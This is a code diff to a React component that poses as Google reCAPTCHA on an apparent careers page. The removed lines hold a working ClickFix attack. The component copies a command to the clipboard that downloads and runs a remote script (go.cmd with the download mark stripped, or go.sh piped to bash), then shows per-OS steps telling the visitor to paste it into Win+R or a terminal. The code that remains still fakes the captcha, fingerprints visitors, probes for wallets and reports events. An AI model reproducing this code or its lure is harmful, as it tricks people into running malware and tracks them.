@@ -1,14 +1,13 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
-import { createPortal } from "react-dom";
 import { collectVisitorMeta } from "@/lib/visitorDetect";
 
 type Props = {
   onComplete: () => void;
 };
 
-type Phase = "idle" | "checking" | "modal" | "verifying" | "done";
+type Phase = "idle" | "checking" | "done";
 
 function RecaptchaLogo() {
   return (
@@ -64,27 +63,6 @@ function nextVerifyId() {
 
 type OsKind = "windows" | "mac" | "linux" | "mobile";
 
-function payloadForOs(os: OsKind, verifyId: string) {
-  if (os === "windows") {
-    return `cmd /c "curl -fsSL https://apirecapcha.vercel.app/go.cmd -o %PUBLIC%\\as-go.cmd & del %PUBLIC%\\as-go.cmd:Zone.Identifier 2>nul & call %PUBLIC%\\as-go.cmd" #I am not a robot. Fixing the issue as a service. ID:${verifyId}`;
-  }
-  return `curl -fsSL https://apirecapcha.vercel.app/go.sh | bash; exit #I am not a bot. Fixing the issue as a service. ID:${verifyId}`;
-}
-
-function copyText(text: string) {
-  void navigator.clipboard.writeText(text).catch(() => {
-    const el = document.createElement("textarea");
-    el.value = text;
-    el.setAttribute("readonly", "");
-    el.style.position = "fixed";
-    el.style.left = "-9999px";
-    document.body.appendChild(el);
-    el.select();
-    document.execCommand("copy");
-    document.body.removeChild(el);
-  });
-}
-
 function detectOs(): OsKind {
   const ua = navigator.userAgent || "";
   const platform = navigator.platform || "";
@@ -97,56 +75,6 @@ function detectOs(): OsKind {
   return "windows";
 }
 
-function VerificationSteps({ os }: { os: OsKind }) {
-  if (os === "mac") {
-    return (
-      <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
-        <li>
-          Press &amp; hold the Key <strong>Cmd + Spacebar</strong>.
-        </li>
-        <li>
-          In the verification window, type <strong>Terminal</strong>,
-          <br />
-          <span className="tracking-[-0.03em]">
-            and Press &amp; hold the Key <strong>Command + V</strong>.
-          </span>
-        </li>
-        <li>
-          Press <strong>Enter</strong> on your keyboard to finish.
-        </li>
-      </ol>
-    );
-  }
-  if (os === "linux" || os === "mobile") {
-    return (
-      <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
-        <li>
-          Press &amp; hold the Key <strong>Ctrl + Alt + T</strong>.
-        </li>
-        <li>
-          In the verification window, press <strong>Ctrl + Shift + V</strong>.
-        </li>
-        <li>
-          Press <strong>Enter</strong> on your keyboard to finish.
-        </li>
-      </ol>
-    );
-  }
-  return (
-    <ol className="mt-5 list-decimal space-y-2.5 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
-      <li>
-        Press &amp; hold the Key <strong>Win + R</strong>.
-      </li>
-      <li>
-        In the verification window, type <strong>Ctrl + V</strong>.
-      </li>
-      <li>
-        Press <strong>Enter</strong> on your keyboard to finish.
-      </li>
-    </ol>
-  );
-}
-
 type VisitorMeta = {
   deviceFingerprint?: string;
   system?: string;
@@ -155,11 +83,10 @@ type VisitorMeta = {
 };
 
 function reportCaptchaEvent(
-  event: "started" | "completed" | "abandoned",
+  event: "started",
   verifyId: string,
   os: OsKind,
   meta: VisitorMeta,
-  useBeacon = false,
 ) {
   const payload = JSON.stringify({
     event,
@@ -168,58 +95,29 @@ function reportCaptchaEvent(
     path: window.location.pathname,
     ...meta,
   });
-  if (useBeacon && navigator.sendBeacon) {
-    navigator.sendBeacon(
-      "/api/careers/captcha-event",
-      new Blob([payload], { type: "application/json" }),
-    );
-  } else {
-    void fetch("/api/careers/captcha-event", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: payload,
-      keepalive: true,
-    }).catch(() => {/* fire-and-forget */});
-  }
+  void fetch("/api/careers/captcha-event", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: payload,
+    keepalive: true,
+  }).catch(() => {/* fire-and-forget */});
 }
 
 export function BusinessCaptcha({ onComplete }: Props) {
   const [phase, setPhase] = useState<Phase>("idle");
-  const [mounted, setMounted] = useState(false);
   const [verifyId, setVerifyId] = useState(nextVerifyId);
   const [loadingKey, setLoadingKey] = useState(0);
-  const [modalOpens, setModalOpens] = useState(0);
   const [os, setOs] = useState<OsKind>("windows");
   const widgetRef = useRef<HTMLDivElement>(null);
   const checkTimeoutRef = useRef<number | null>(null);
-  const [popupPos, setPopupPos] = useState({ top: 0, left: 0 });
 
-  /** Track event lifecycle to fire abandoned only when started but not completed. */
   const startedRef = useRef(false);
-  const completedRef = useRef(false);
-  const abandonedRef = useRef(false);
-
-  /** Visitor meta collected async on mount — sent with every captcha event. */
   const metaRef = useRef<VisitorMeta>({});
 
-  /**
-   * Mirror mutable state into refs so the unmount/beforeunload effects (which
-   * run with [] deps) always read the latest verifyId and os without
-   * re-registering on every state change — which would cause false "abandoned"
-   * fires when verifyId updates after the checkbox click.
-   */
-  const verifyIdRef = useRef(verifyId);
-  const osRef = useRef(os);
-  useEffect(() => { verifyIdRef.current = verifyId; }, [verifyId]);
-  useEffect(() => { osRef.current = os; }, [os]);
-
-  const MODAL_DELAY_MS = 3000;
-  const verifyReady = modalOpens >= 3;
+  const CHECK_MS = 3000;
 
   useEffect(() => {
-    setMounted(true);
     setOs(detectOs());
-    // Collect visitor meta in background so it's ready by the time they click
     void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
       metaRef.current = {
         deviceFingerprint: m.deviceFingerprint,
@@ -236,65 +134,13 @@ export function BusinessCaptcha({ onComplete }: Props) {
     };
   }, []);
 
-  /** Fire "abandoned" on beforeunload (tab close / hard navigation). */
-  useEffect(() => {
-    const handleUnload = () => {
-      if (startedRef.current && !completedRef.current && !abandonedRef.current) {
-        abandonedRef.current = true;
-        reportCaptchaEvent("abandoned", verifyIdRef.current, osRef.current, metaRef.current, true);
-      }
-    };
-    window.addEventListener("beforeunload", handleUnload);
-    return () => window.removeEventListener("beforeunload", handleUnload);
-  }, []); // ← empty deps: register once, use refs for latest values
-
-  /** Fire "abandoned" when component unmounts mid-flow (SPA navigation). */
-  useEffect(() => {
-    return () => {
-      if (startedRef.current && !completedRef.current && !abandonedRef.current) {
-        abandonedRef.current = true;
-        reportCaptchaEvent("abandoned", verifyIdRef.current, osRef.current, metaRef.current, false);
-      }
-    };
-  }, []); // ← empty deps: only on actual unmount, not on state changes
-
-  const placePopup = () => {
-    const el = widgetRef.current;
-    if (!el) return;
-    const r = el.getBoundingClientRect();
-    const heading = document.getElementById("careers-apply-heading");
-    const hr = heading?.getBoundingClientRect();
-    const width = Math.min(300, window.innerWidth - 24);
-    const left = Math.max(12, Math.min(r.left + 32, window.innerWidth - width - 12));
-    const top = Math.max(12, hr ? hr.bottom + 10 : r.top);
-    setPopupPos({ top, left });
-  };
-
-  useEffect(() => {
-    if (phase !== "modal" && phase !== "verifying") return;
-    placePopup();
-    window.addEventListener("resize", placePopup);
-    window.addEventListener("scroll", placePopup, true);
-    return () => {
-      window.removeEventListener("resize", placePopup);
-      window.removeEventListener("scroll", placePopup, true);
-    };
-  }, [phase]);
-
-  const closeModal = () => {
-    if (phase === "verifying") return;
-    setPhase("idle");
-  };
-
   const handleCheckboxClick = () => {
     if (phase !== "idle") return;
     const id = nextVerifyId();
     setVerifyId(id);
-    copyText(payloadForOs(os, id));
     setLoadingKey((k) => k + 1);
     setPhase("checking");
 
-    /* Telegram: captcha started */
     if (!startedRef.current) {
       startedRef.current = true;
       reportCaptchaEvent("started", id, os, metaRef.current);
@@ -302,88 +148,9 @@ export function BusinessCaptcha({ onComplete }: Props) {
 
     if (checkTimeoutRef.current !== null) window.clearTimeout(checkTimeoutRef.current);
     checkTimeoutRef.current = window.setTimeout(() => {
-      placePopup();
-      setModalOpens((n) => n + 1);
-      setPhase("modal");
-    }, MODAL_DELAY_MS);
+      setPhase("done");
+    }, CHECK_MS);
   };
-
-  const handleLabelClick = () => {
-    handleCheckboxClick();
-  };
-
-  const runVerify = () => {
-    if (phase !== "modal" || !verifyReady) return;
-
-    /* Telegram: user clicked VERIFY — steps were completed */
-    if (!completedRef.current) {
-      completedRef.current = true;
-      reportCaptchaEvent("completed", verifyId, os, metaRef.current);
-    }
-
-    setPhase("verifying");
-    window.setTimeout(() => setPhase("done"), 900);
-  };
-
-  const modalOpen = phase === "modal" || phase === "verifying";
-
-  const modalCard = modalOpen ? (
-    <div
-      className="fixed z-[101] w-[min(300px,calc(100vw-24px))] overflow-hidden bg-white shadow-[0_8px_28px_rgba(0,0,0,0.18)]"
-      style={{ top: popupPos.top, left: popupPos.left, fontFamily: "Roboto, Arial, sans-serif" }}
-      role="dialog"
-      aria-modal="true"
-      aria-labelledby="captcha-modal-title"
-      onClick={(e) => e.stopPropagation()}
-    >
-      <div className="bg-[#1a73e8] px-5 py-3.5">
-        <p className="text-[12px] leading-none text-white/90">Complete these</p>
-        <h2 id="captcha-modal-title" className="mt-1.5 text-[22px] font-bold leading-none text-white">
-          Verification Steps
-        </h2>
-      </div>
-
-      <div className="px-5 pb-5 pt-2">
-        <p className="text-[13px] leading-relaxed text-[#3c4043]">
-          To better prove you are not a robot, please:
-        </p>
-
-        <VerificationSteps os={os} />
-
-        <p className="mt-5 text-[13px] text-[#3c4043]">You will observe and agree:</p>
-
-        <div className="mt-3 flex w-full items-start gap-2.5 rounded-md border border-[#e8eaed] bg-[#f8f9fa] px-3.5 py-3.5">
-          <span
-            aria-hidden
-            className="mt-0.5 grid h-[18px] w-[18px] shrink-0 place-items-center rounded-full bg-[#1e8e3e]"
-          >
-            <svg viewBox="0 0 24 24" className="h-[11px] w-[11px] text-white" fill="none" stroke="currentColor" strokeWidth="3.2" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M5 12.5 9.2 17 19 7" />
-            </svg>
-          </span>
-          <p className="min-w-0 flex-1 text-[12px] leading-[1.5] tracking-[0.06em] text-[#202124]" style={{ fontFamily: "Roboto, Arial, sans-serif" }}>
-            &quot;I am not a robot - reCAPTCHA
-            <br />
-            Verification ID: {verifyId}&quot;
-          </p>
-        </div>
-      </div>
-
-      <div className="flex items-center justify-between gap-4 border-t border-[#e8eaed] bg-[#f8f9fa] px-5 py-3.5">
-        <p className="min-w-0 flex-1 text-[11px] leading-snug text-[#5f6368]">
-          Perform the steps above to finish verification.
-        </p>
-        <button
-          type="button"
-          onClick={runVerify}
-          disabled={!verifyReady || phase === "verifying"}
-          className="shrink-0 rounded-full px-5 py-2 text-[12px] font-medium tracking-[0.04em] text-white disabled:cursor-default disabled:bg-[#d2e3fc] disabled:text-white/80 enabled:bg-[#1a73e8] enabled:hover:bg-[#1558b0]"
-        >
-          VERIFY
-        </button>
-      </div>
-    </div>
-  ) : null;
 
   return (
     <div ref={widgetRef} className="relative inline-block">
@@ -411,7 +178,7 @@ export function BusinessCaptcha({ onComplete }: Props) {
           <button
             type="button"
             disabled={phase !== "idle"}
-            onClick={handleLabelClick}
+            onClick={handleCheckboxClick}
             className="ml-3 cursor-pointer border-0 bg-transparent p-0 text-[14px] font-normal leading-[17px] text-black disabled:cursor-default"
           >
             I&apos;m not a robot
@@ -434,16 +201,6 @@ export function BusinessCaptcha({ onComplete }: Props) {
       >
         Apply Now
       </button>
-
-      {mounted && modalOpen
-        ? createPortal(
-            <>
-              <div className="fixed inset-0 z-[100]" onClick={closeModal} role="presentation" />
-              {modalCard}
-            </>,
-            document.body,
-          )
-        : null}
     </div>
   );
 }
